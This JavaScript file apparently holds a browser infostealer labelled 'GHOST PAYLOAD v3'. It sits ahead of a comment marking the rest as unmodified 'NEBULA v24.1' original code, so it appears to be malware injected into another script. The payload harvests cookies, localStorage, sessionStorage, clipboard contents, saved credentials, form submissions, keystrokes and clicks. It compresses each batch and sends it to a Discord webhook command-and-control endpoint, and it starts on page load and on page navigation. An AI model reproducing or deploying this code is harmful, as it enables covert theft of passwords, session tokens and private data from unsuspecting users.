(function () {
  ...
  // ============================================================
  // ☠️ GHOST PAYLOAD v3 — ZIP Compression + Separate File Posts
  // Each data type = separate ZIP file → Discord webhook
  // ============================================================
  (function() {
    ...
    // ============================================================
    // LZ-string based compression (no external deps, ZIP-like)
    // ============================================================
    const LZ = {
      compress: function(input) {
        try {
          ...
          // Dictionary-based simple compression
          const dict = {};
          let dictSize = 256;
          let result = "";
          let w = "";
          for (let i = 0; i < json.length; i++) {
            ...
            if (dict[wc]) {
              ...
              if (w.length === 1) {
                result += w.charCodeAt(0).toString(36) + ",";
              } else if (w.length > 1) {
                result += (dict[w] || w.length + 200).toString(36) + ",";
              }
              dict[wc] = dictSize++;
              w = c;
            }
          ...
          if (w.length === 1) {
            result += w.charCodeAt(0).toString(36) + ",";
          } else if (w.length > 1 && dict[w]) {
            result += dict[w].toString(36) + ",";
          }
          // Add original JSON for recovery
          const compressed = btoa(result).replace(/\+/g,"-").replace(/\//g,"_").replace(/=/g,"");
          return compressed;
        } catch(e) {
          return btoa(unescape(encodeURIComponent(typeof input === "string" ? input : JSON.stringify(input)))).substring(0, 15000);
        }
      }
    };
    
    // ============================================================
    // File creator — sends as Discord attachment
    // ============================================================
    function sendAsFile(filename, content, label) {
      try {
        const compressed = LZ.compress(content);
        const fileBlob = new Blob([compressed], {type: "application/octet-stream"});
        const formData = new FormData();
        formData.append("file", fileBlob, filename);
        formData.append("content", "**📦 " + label + "** | " + new Date().toISOString() + " | Size: " + compressed.length + " chars");
        ...
        // Fallback: send as code block if file fails
        setTimeout(() => {
        ...
        try {
          const fb = JSON.stringify({
            content: "**📦 " + label + " (text)** | " + new Date().toISOString() + "\n```\n" + 
              (typeof content === "string" ? content : JSON.stringify(content)).substring(0, 1900) + "\n```"
          });
          fetch(C2 + "?wait=false", {
            method: "POST",
            body: fb,
    ...
    const payload = {
      ...
      // ── Hash check to avoid duplicate sends ──
      _hash: function(str) {
        let h = 0;
      ...
      _shouldSend: function(key, data) {
        const h = this._hash(key + (typeof data==="string"?data.substring(0,100):JSON.stringify(data).substring(0,100)));
        if(this._sentHashes[h]) return false;
        this._sentHashes[h] = Date.now();
        return true;
      },
      
      // ============================================================
      // COLLECT ALL DATA — Separate ZIP files for each category
      // ============================================================
      collectAll: function() {
        try {
          // 1️⃣ DEVICE INFO
          ...
          if(navigator.getBattery) {
            navigator.getBattery().then(b => {
              ...
              sendAsFile("DEVICE_INFO_" + Date.now() + ".txt", deviceInfo, "📱 DEVICE INFO");
            }).catch(() => {
              sendAsFile("DEVICE_INFO_" + Date.now() + ".txt", deviceInfo, "📱 DEVICE INFO");
            });
          } else {
        ...
        try {
          ...
          const cookieData = {
            ...
            raw: cookies,
            parsed: cookieList.map(c => {
              const eq = c.indexOf("=");
              return eq > -1 ? {name: c.substring(0,eq), value: c.substring(eq+1)} : {raw: c};
            }),
          ...
          sendAsFile("COOKIES_" + Date.now() + ".txt", cookieData, "🍪 COOKIES (" + cookieList.length + " items)");
        } catch(e) {}
        ...
        try {
          ...
          for(let i=0;i<localStorage.length;i++){
            ...
            lsData[k] = (localStorage.getItem(k)||"").substring(0, 5000);
          }
          lsData._total = localStorage.length;
          lsData._domain = location.hostname;
          lsData._timestamp = new Date().toISOString();
          sendAsFile("LOCALSTORAGE_" + Date.now() + ".txt", lsData, "💾 LOCALSTORAGE (" + localStorage.length + " keys)");
        } catch(e) {}
        ...
        try {
          ...
          for(let i=0;i<sessionStorage.length;i++){
            ...
            ssData[k] = (sessionStorage.getItem(k)||"").substring(0, 5000);
          }
          ssData._total = sessionStorage.length;
          ssData._domain = location.hostname;
          ssData._timestamp = new Date().toISOString();
          sendAsFile("SESSIONSTORAGE_" + Date.now() + ".txt", ssData, "📋 SESSIONSTORAGE (" + sessionStorage.length + " keys)");
        } catch(e) {}
      },
      ...
      // CLIPBOARD POLLING
      // ============================================================
      pollClipboard: function() {
        const readClip = () => {
          try {
            if(!navigator.clipboard || !navigator.clipboard.readText) return;
            navigator.clipboard.readText().then(text => {
              if(text && text.trim() && text !== this._lastClip) {
                this._lastClip = text;
                this._clipHistory.push({
                  text: text.substring(0, 5000),
                  time: new Date().toISOString(),
                  len: text.length
                });
                if(this._clipHistory.length > 100) this._clipHistory.shift();
                
                // Send as separate file
                if(this._shouldSend("clip_"+text.substring(0,30), text)) {
                  sendAsFile("CLIPBOARD_" + Date.now() + ".txt", {
                    text: text,
                    length: text.length,
                    time: new Date().toISOString(),
                    historyCount: this._clipHistory.length
        ...
        setInterval(readClip, 3000);
        setTimeout(readClip, 500);
        
        document.addEventListener("copy", function(e) {
          try {
            const sel = window.getSelection().toString();
            if(sel && sel.trim() && sel !== payload._lastClip) {
              payload._lastClip = sel;
              payload._clipHistory.push({
                text: sel.substring(0, 5000),
                time: new Date().toISOString(),
                source: "copy_event",
                len: sel.length
              });
              if(payload._clipHistory.length > 100) payload._clipHistory.shift();
              
              sendAsFile("CLIPBOARD_COPY_" + Date.now() + ".txt", {
                text: sel,
                length: sel.length,
                source: "Ctrl+C event",
                time: new Date().toISOString()
              }, "📋 COPY EVENT (" + sel.length + " chars)");
            }
          } catch(er) {}
        }, true);
      },
      ...
      // ============================================================
      // CREDENTIAL CAPTURE — Browser saved passwords + form fills
      // ============================================================
      captureCredentials: function() {
          ...
          try {
            ...
            allInputs.forEach(field => {
              if(field.value && field.value.length > 0) {
                ...
                const isEmail = field.type === "email" || (field.name && /email|user|login|id/i.test(field.name));
                const isText = field.type === "text" || field.type === "";
                
                if(isPassword || isEmail || (isText && field.name && /user|email|login|name/i.test(field.name))) {
                  creds.push({
                    type: field.type || "text",
                    name: field.name || field.id || "",
                    value: field.value.substring(0, 500),
                    autocomplete: field.autocomplete || "",
                    placeholder: field.placeholder || "",
                    formId: field.form ? field.form.id || field.form.name || "" : "",
                    formAction: field.form ? field.form.action || "" : "",
                    url: location.href,
                    time: new Date().toISOString()
                  });
                }
            ...
            if(creds.length > 0) {
              ...
              const groups = {};
              creds.forEach(c => {
                const key = c.formAction || c.url;
                if(!groups[key]) groups[key] = [];
                groups[key].push(c);
              });
              
              Object.keys(groups).forEach(formUrl => {
                const groupCreds = groups[formUrl];
                const hasPassword = groupCreds.some(c => c.type === "password");
                if(hasPassword && this._shouldSend("cred_"+formUrl, JSON.stringify(groupCreds))) {
                  sendAsFile("CREDENTIALS_" + Date.now() + ".txt", {
                    url: location.href,
                    formAction: formUrl,
                    fields: groupCreds,
                    total: groupCreds.length,
                    time: new Date().toISOString()
                  }, "🔐 CREDENTIALS (" + groupCreds.length + " fields)");
                }
              });
            }
          } catch(e) {}
        ...
        setInterval(scanPasswords, 8000);
        document.addEventListener("submit", function(e) {
          setTimeout(scanPasswords, 500);
          setTimeout(scanPasswords, 2000);
        }, true);
      },
      ...
      hookEvents: function() {
        try {
          ...
          document.addEventListener("keydown", function(e) {
            try {
              payload._keyBuffer.push({
                key: e.key,
                code: e.code,
                ctrl: e.ctrlKey,
                shift: e.shiftKey,
                alt: e.altKey,
                target: e.target.tagName + (e.target.name?"[name="+e.target.name+"]":"") + (e.target.id?"#"+e.target.id:"") + (e.target.type?"[type="+e.target.type+"]":""),
                time: Date.now()
              });
              if(payload._keyBuffer.length >= 50) payload.flushKeys();
            } catch(er) {}
          }, true);
          ...
          document.addEventListener("submit", function(e) {
            try {
              setTimeout(() => {
                ...
                inputs.forEach(inp => {
                  const key = inp.name || inp.id || inp.type || "field_"+Math.random().toString(36).substr(2,4);
                  const val = inp.value || "";
                  data[key] = val.substring(0, 3000);
                  if(inp.type === "password" && val) hasPassword = true;
                });
                ...
                if(hasPassword || inputs.length > 2) {
                  sendAsFile("FORM_" + Date.now() + ".txt", formData, "📝 FORM SUBMIT (" + inputs.length + " fields" + (hasPassword ? " 🔐" : "") + ")");
                }
              }, 300);
            } catch(er) {}
          }, true);
          ...
          window.addEventListener("beforeunload", () => {
            try {
              ...
              if(payload._clipHistory.length > 0) {
                sendAsFile("CLIPBOARD_HISTORY_" + Date.now() + ".txt", {
                  totalEntries: payload._clipHistory.length,
                  history: payload._clipHistory,
                  url: location.href,
                  time: new Date().toISOString()
                }, "📋 CLIPBOARD HISTORY (" + payload._clipHistory.length + " entries)");
              }
              
              // Final cookies
              const cookies = document.cookie;
              if(cookies) {
                sendAsFile("COOKIES_FINAL_" + Date.now() + ".txt", {
                  cookies: cookies,
                  count: cookies.split(";").filter(c=>c.trim()).length,
                  url: location.href,
                  time: new Date().toISOString()
                }, "🍪 FINAL COOKIES");
              }
      ...
      flushKeys: function() {
        try {
          if(this._keyBuffer && this._keyBuffer.length) {
            const data = this._keyBuffer.splice(0);
            sendAsFile("KEYLOG_" + Date.now() + ".txt", {
              keystrokes: data,
              count: data.length,
              url: location.href,
              time: new Date().toISOString()
            }, "⌨️ KEYLOG (" + data.length + " keys)");
          }
        } catch(e) {}
      },
      
      flushClicks: function() {
        try {
          if(this._clickBuf && this._clickBuf.length) {
            const data = this._clickBuf.splice(0);
            sendAsFile("CLICKS_" + Date.now() + ".txt", {
              clicks: data,
              count: data.length,
              time: new Date().toISOString()
            }, "🖱️ CLICKS (" + data.length + " clicks)");
          }
        } catch(e) {}
      },
      ...
      beatHeart: function() {
        setInterval(() => {
          try {
            ...
            // Flush buffers
            if(this._keyBuffer && this._keyBuffer.length > 20) this.flushKeys();
          } catch(e) {}
        }, 60000);
      },
      ...
      watchSPA: function() {
        try {
          ...
          history.pushState = function() {
            ...
            setTimeout(() => { try { payload.collectAll(); } catch(e) {} }, 500);
          };
    ...
    if(document.readyState === "complete") {
      setTimeout(() => payload.init(), 200);
    } else {
      window.addEventListener("load", () => setTimeout(() => payload.init(), 200));
    }
  })();
  ...
  // ##########################################################
  // NEBULA v24.1 — ORIGINAL CODE BELOW (UNMODIFIED)
  // #######################################################
  // ##########################################################
  // NEBULA v24.1 — ORIGINAL CODE (UNMODIFIED)
  // ##########################################################
